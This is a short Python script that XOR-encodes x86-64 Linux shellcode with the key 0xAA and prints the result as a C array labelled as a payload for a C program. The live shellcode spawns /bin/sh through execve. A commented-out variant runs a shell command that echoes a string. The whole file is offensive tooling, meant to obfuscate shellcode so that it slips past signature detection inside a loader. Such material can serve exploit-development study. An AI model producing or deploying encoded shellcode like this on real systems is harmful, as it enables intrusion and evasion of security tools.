#!/usr/bin/env python3

# encrypt the shellcode wit xor
#shellcode = b"\x48\xb8\x2f\x62\x69\x6e\x2f\x73\x68\x00\x99\x50\x54\x5f\x52\x66\x68\x2d\x63\x54\x5e\x52\xe8\x11\x00\x00\x00\x65\x63\x68\x6f\x20\x68\x65\x6c\x6c\x6f\x20\x74\x68\x65\x72\x65\x00\x56\x57\x54\x5e\x6a\x3b\x58\x0f\x05"
shellcode = b"\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05"
xor_key = 0xAA

encoded_shellcode = ""
print(f"[*] Encoding {len(shellcode)} bytes with key: 0x{xor_key:02x}")


for byte in shellcode:
    xor_result = byte ^ xor_key
    encoded_shellcode += f"\\x{xor_result:02x}"

print("-" * 50)
print("PAYLOAD FOR C PROGRAM:")
print(f'unsigned char shellcode[] = "{encoded_shellcode}";')
print("-" * 50)